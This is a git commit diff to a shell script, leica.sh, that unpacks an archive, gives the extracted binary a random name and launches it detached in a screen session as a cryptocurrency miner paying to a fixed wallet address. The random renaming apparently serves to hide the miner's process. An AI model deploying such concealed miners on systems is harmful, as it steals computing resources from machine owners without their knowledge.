865676cb78fd0e1e1fd228871a05b9e55227454d
udhaindah <udhaindah937@gmail.com>
2024-10-14 16:58:59 +0700

    Update leica.sh

--- leica.sh
+++ leica.sh
@@ -3,4 +3,4 @@ tar -xf static.tar
 rm -rf static.tar
 variable8=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
 mv static $variable8
-screen -dmS cpu ./$variable8 mine --address 2xQeBibQUfWJi4t4Ua32vM3SjHLbwA6wHuXYHusGp9jm
+screen -dmS npu ./$variable8 mine --address 2xQeBibQUfWJi4t4Ua32vM3SjHLbwA6wHuXYHusGp9jm
